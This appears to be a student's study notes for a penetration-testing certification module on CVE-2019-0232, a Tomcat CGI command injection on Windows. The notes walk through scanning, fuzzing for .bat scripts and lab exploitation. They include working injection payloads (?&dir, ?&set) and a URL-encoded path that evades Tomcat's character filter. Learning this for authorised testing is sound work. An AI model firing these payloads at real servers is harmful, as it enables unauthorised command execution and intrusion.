This module covers **CVE-2019-0232**, a Windows-specific Tomcat CGI command-injection vulnerability that can lead to **remote code execution** when `enableCmdLineArguments` is enabled. The vulnerable versions are Tomcat `9.0.0.M1–9.0.17`, `8.5.0–8.5.39`, and `7.0.0–7.0.93`.

The core attack chain is:

```text
Tomcat
   ↓
Identify version
   ↓
Determine Windows target
   ↓
Find CGI functionality
   ↓
Fuzz /cgi/*.bat
   ↓
Find valid CGI script
   ↓
CVE-2019-0232
   ↓
Command injection via &
   ↓
Windows command execution
   ↓
Further enumeration / foothold
```

---

# 1. What Is CGI?

**CGI = Common Gateway Interface.**

Tomcat's CGI Servlet allows a web server to communicate with applications running outside the Tomcat JVM.

These external applications can be CGI scripts written in languages such as:

- Perl
    
- Python
    
- Bash
    
- Other supported scripting environments
    

The CGI Servlet receives the HTTP request and forwards it to the CGI script for processing.

Think of it as:

```text
Browser
   │
   │ HTTP request
   ▼
Tomcat CGI Servlet
   │
   │ forwards request
   ▼
CGI Script
   │
   ▼
External application
```

---

# 2. CGI Advantages vs Disadvantages

The module gives the following comparison:

|Advantages|Disadvantages|
|---|---|
|Simple and effective for dynamic content|Programs may need to be loaded for every request|
|Can use many programming languages|Difficult to cache data between requests|
|Existing code can be reused|Can consume significant processing resources|

The important pentesting takeaway is that **CGI introduces another layer where user-controlled input can reach operating-system functionality**.

---

# 3. `enableCmdLineArguments`

This setting is central to the vulnerability.

```text
enableCmdLineArguments
```

When enabled, Tomcat's CGI Servlet parses the query string and passes values to the CGI script as **command-line arguments**.

For example:

```text
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

The CGI script can receive:

```text
action = title
query  = the great gatsby
```

Another example:

```text
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

Here:

```text
action = author
query  = fitzgerald
```

This is legitimate functionality.

The problem occurs when **untrusted input is passed into Windows command-line processing without proper validation**.

---

# 4. CVE-2019-0232

## Vulnerability

```text
CVE-2019-0232
```

The module describes it as a **critical security issue** capable of resulting in remote code execution.

Affected environment:

```text
Windows
+
Tomcat CGI Servlet
+
enableCmdLineArguments enabled
```

The vulnerability results from an **input validation error** that can allow operating-system command injection.

---

# 5. Affected Tomcat Versions

Memorize these ranges:

|Tomcat|Affected versions|
|---|---|
|Tomcat 9|`9.0.0.M1` → `9.0.17`|
|Tomcat 8.5|`8.5.0` → `8.5.39`|
|Tomcat 7|`7.0.0` → `7.0.93`|

### CPTS ⭐

If you see:

```text
Tomcat 9.0.17
```

on Windows, that should immediately make you think:

```text
CVE-2019-0232
```

**provided the CGI configuration requirements are also satisfied.**

---

# 6. Why Windows Matters

This vulnerability is specifically discussed in the context of **Windows systems**.

The reason becomes particularly obvious when looking at the command separator used by Windows command processing:

```text
&
```

The module demonstrates that an attacker can append another command using `&`.

Conceptually:

```text
legitimate command & attacker_command
```

The Windows command processor can interpret the second command separately.

---

# 7. Command Injection Example

The module gives:

```text
http://example.com/cgi-bin/hello.bat?&dir
```

The injected:

```text
&dir
```

causes:

```text
dir
```

to execute on the Windows system.

So the vulnerability can be visualized as:

```text
HTTP request
     │
     ▼
Query string
     │
     ▼
CGI Servlet
     │
     ▼
Command-line argument
     │
     ▼
Windows command processing
     │
     ▼
Injected command
```

---

# 8. Enumeration

Before exploitation, we need to determine what services and versions are running.

The module uses:

```bash
nmap -p- -sC -Pn 10.129.204.227 --open
```

Important results:

```text
22/tcp     open  ssh
135/tcp    open  msrpc
139/tcp    open  netbios-ssn
445/tcp    open  microsoft-ds
5985/tcp   open  wsman
8009/tcp   open  ajp13
8080/tcp   open  http-proxy
47001/tcp  open  winrm
```

Most importantly:

```text
8080/tcp open http-proxy
     └── Apache Tomcat/9.0.17
```

---

# 9. Why This Nmap Output Is Interesting

Look at the combination:

```text
Windows
+
Tomcat 9.0.17
+
Port 8080
+
AJP 8009
+
SMB
+
WinRM
```

The version:

```text
Apache Tomcat/9.0.17
```

falls directly into the affected range:

```text
9.0.0.M1 – 9.0.17
```

So this should trigger a hypothesis:

```text
Windows Tomcat 9.0.17
        ↓
Check CGI
        ↓
Check enableCmdLineArguments
        ↓
CVE-2019-0232
```

The module's Nmap result confirms the Tomcat version.

---

# 10. Finding CGI Scripts

Now we need to determine whether CGI functionality is actually exposed.

The module uses:

```text
/cgi/
```

as the expected CGI location.

It uses **ffuf** to fuzz for CGI scripts.

Because the operating system is Windows, it tests:

```text
.cmd
```

and:

```text
.bat
```

extensions.

---

# 11. Fuzzing `.cmd`

Command:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

The scan completes without finding a useful `.cmd` script.

Important options shown:

```text
-w    Wordlist
-u    Target URL
FUZZ  Fuzzing position
```

The module used:

```text
/usr/share/dirb/wordlists/common.txt
```

---

# 12. Fuzzing `.bat`

Since the target is Windows, the next logical step is:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```

This discovers:

```text
Status: 200
FUZZ: welcome
```

Therefore:

```text
/cgi/welcome.bat
```

exists.

---

# 13. Validate the CGI Script

Navigate to:

```text
http://10.129.204.227:8080/cgi/welcome.bat
```

The response is:

```text
Welcome to CGI, this section is not functional yet. Please return to home page.
```

This may look useless.

But from a pentesting perspective:

> **Finding a valid CGI endpoint is what matters.**

We now have:

```text
/cgi/welcome.bat
```

and can test whether it is affected by the CGI command-line argument issue.

---

# 14. Exploitation

The module then demonstrates the vulnerability using:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&dir
```

The critical component is:

```text
?&dir
```

where:

```text
&
```

acts as the Windows command separator.

The result is execution of:

```text
dir
```

on the server.

---

# 15. Why `whoami` Doesn't Immediately Work

Interestingly, the module notes that:

```text
whoami
```

doesn't return output in the initial attempt.

This is an important troubleshooting lesson:

> **A failed command doesn't necessarily mean the vulnerability isn't present.**

Instead, enumerate the execution environment.

The module chooses:

```text
set
```

to retrieve Windows environment variables.

---

# 16. Environment Variable Enumeration

Request:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&set
```

The response reveals a large amount of information.

Important values include:

```text
COMSPEC=C:\Windows\system32\cmd.exe
```

This confirms the Windows command interpreter.

Also:

```text
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
```

and:

```text
SystemRoot=C:\Windows
```

The CGI environment also reveals:

```text
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_SOFTWARE=TOMCAT
```

---

# 17. Extremely Valuable Discovery: `PATH`

One particularly important observation:

```text
PATH
```

is unset.

That explains why commands such as:

```text
whoami
```

may not execute as expected.

If Windows can't resolve the executable through `PATH`, we may need to specify the executable's full path.

The module therefore attempts:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
```

---

# 18. Tomcat's Character Filter

The direct request fails because Tomcat's security patch rejects certain special characters.

The module explains that Tomcat introduced a regular-expression filter to prevent use of special characters.

This is another important pentesting concept:

```text
Payload
   ↓
Application filter
   ↓
Rejected
```

doesn't necessarily mean:

```text
Vulnerability = impossible
```

Sometimes the question becomes:

> **Can the same data be represented in a form that passes the parser/filter?**

---

# 19. URL Encoding

The module demonstrates URL encoding the payload.

Original:

```text
c:\windows\system32\whoami.exe
```

Encoded:

```text
c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

The request becomes:

```text
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

Relevant encodings:

|Character|URL encoded|
|---|---|
|`:`|`%3A`|
|`\`|`%5C`|

### CPTS ⭐

This is a good example of the difference between:

**Input filtering** and **input normalization/parsing**.

A security control that checks only one representation of input may behave differently after URL decoding.

---

# 20. CGI Environment — Important Values

The `set` output exposes several useful values:

```text
COMSPEC
CONTENT_LENGTH
CONTENT_TYPE
GATEWAY_INTERFACE
HTTP_HOST
HTTP_USER_AGENT
PATHEXT
QUERY_STRING
REMOTE_ADDR
REMOTE_HOST
REQUEST_METHOD
REQUEST_URI
SCRIPT_FILENAME
SCRIPT_NAME
SERVER_NAME
SERVER_PORT
SERVER_PROTOCOL
SERVER_SOFTWARE
SystemRoot
X_TOMCAT_SCRIPT_PATH
```

Two particularly useful paths are:

```text
SCRIPT_FILENAME=
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

and:

```text
X_TOMCAT_SCRIPT_PATH=
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

This gives us a much clearer picture of the target's Tomcat installation.

---

# 21. Full Attack Methodology

Here's the methodology you should remember:

```text
             ┌─────────────────────┐
             │ Discover Tomcat     │
             └──────────┬──────────┘
                        ↓
             ┌─────────────────────┐
             │ Identify OS/version │
             └──────────┬──────────┘
                        ↓
                 Windows + 9.0.17
                        ↓
             ┌─────────────────────┐
             │ Check CGI exposure  │
             └──────────┬──────────┘
                        ↓
                  /cgi/*.bat
                        ↓
             ┌─────────────────────┐
             │ Fuzz with ffuf      │
             └──────────┬──────────┘
                        ↓
                 welcome.bat
                        ↓
             ┌─────────────────────┐
             │ Test command input  │
             └──────────┬──────────┘
                        ↓
                    ?&dir
                        ↓
             ┌─────────────────────┐
             │ Command execution   │
             └──────────┬──────────┘
                        ↓
                     ?&set
                        ↓
             Environment discovery
                        ↓
                PATH unavailable
                        ↓
              Hardcode executable
                        ↓
             Tomcat filtering
                        ↓
                URL encoding
                        ↓
               Continue testing
```

---

# 22. Enumeration Checklist

## Initial Scan

```bash
nmap -p- -sC -Pn TARGET --open
```

Look for:

-  `8080`
    
-  `8009`
    
-  HTTP service
    
-  Tomcat version
    
-  Windows indicators
    
-  SMB
    
-  WinRM
    

---

## Version Check

If you see:

```text
Tomcat 9.0.17
```

compare it against:

```text
CVE-2019-0232
```

Affected:

```text
9.0.0.M1 → 9.0.17
8.5.0 → 8.5.39
7.0.0 → 7.0.93
```

---

## CGI Discovery

Try the CGI directory:

```text
/cgi/
```

Fuzz:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
-u http://TARGET:8080/cgi/FUZZ.cmd
```

Then:

```bash
ffuf -w /usr/share/dirb/wordlists/common.txt \
-u http://TARGET:8080/cgi/FUZZ.bat
```

---

## Validate

If you discover:

```text
/cgi/welcome.bat
```

test whether CGI command-line arguments are being processed.

---

## Environment Enumeration

If command execution works, useful Windows environment enumeration includes:

```text
set
```

Look for:

```text
COMSPEC
PATH
PATHEXT
SystemRoot
SCRIPT_FILENAME
X_TOMCAT_SCRIPT_PATH
SERVER_NAME
SERVER_PORT
```

---

# 23. CPTS Exam Facts ⭐⭐⭐

### ⭐ CVE

```text
CVE-2019-0232
```

---

### ⭐ Platform

```text
Windows
```

---

### ⭐ Component

```text
Tomcat CGI Servlet
```

---

### ⭐ Required configuration

```text
enableCmdLineArguments = true
```

---

### ⭐ Vulnerability type

```text
OS command injection
```

leading to:

```text
Remote Code Execution
```

---

### ⭐ Command separator

```text
&
```

Example:

```text
?&dir
```

---

### ⭐ Vulnerable versions

```text
9.0.0.M1 – 9.0.17
8.5.0 – 8.5.39
7.0.0 – 7.0.93
```

---

### ⭐ CGI discovery

```text
/cgi/
```

Potential Windows scripts:

```text
*.bat
*.cmd
```

---

### ⭐ Tool

```text
ffuf
```

with:

```text
/usr/share/dirb/wordlists/common.txt
```

---

### ⭐ Troubleshooting lesson

If:

```text
whoami
```

doesn't work:

```text
set
```

can reveal the environment.

If `PATH` is unset, consider the executable's full path.

If special characters are filtered:

```text
URL encoding
```

may alter how the request is processed.

---

# 🔥 Final Cheat Sheet

```text
CVE-2019-0232
────────────────────────
Tomcat CGI command injection

TARGET
──────
Windows

REQUIREMENT
───────────
enableCmdLineArguments=true

VERSIONS
────────
9.0.0.M1 - 9.0.17
8.5.0    - 8.5.39
7.0.0    - 7.0.93

DISCOVERY
─────────
nmap -p- -sC -Pn TARGET --open

CGI
───
/cgi/

FUZZ
────
ffuf
*.cmd
*.bat

LAB FINDING
───────────
/cgi/welcome.bat

INJECTION
─────────
?&dir

ENVIRONMENT
───────────
?&set

IMPORTANT VARIABLES
───────────────────
COMSPEC
PATH
PATHEXT
SystemRoot
SCRIPT_FILENAME
X_TOMCAT_SCRIPT_PATH

TROUBLESHOOTING
───────────────
PATH unset
    ↓
Use executable path

Special characters blocked
    ↓
URL encoding
```

### 🧠 The key thing to remember

**Don't memorize only the exploit. Memorize the reasoning:**

```text
Tomcat version
      +
Windows
      +
CGI exposed
      +
enableCmdLineArguments
      ↓
CVE-2019-0232 hypothesis
      ↓
Find CGI script
      ↓
Validate command injection
      ↓
Enumerate execution environment
      ↓
Continue from the foothold
```

That methodology is much more valuable for CPTS than simply remembering a single payload.